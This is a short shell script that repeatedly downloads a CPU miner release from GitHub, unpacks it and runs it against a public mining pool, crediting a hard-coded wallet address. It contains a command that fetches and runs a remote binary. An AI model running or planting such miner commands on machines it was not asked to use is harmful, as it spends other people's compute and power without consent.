#!/bin/sh

COUNTER=20
until [  $COUNTER -lt 10 ]; do
            
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-avx2 -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u D6ph2BjEmY1BB558NXcasUgTbxvmg7HH2E -p c=DGB -t 2

     echo COUNTER $COUNTER
     let COUNTER-=1
done

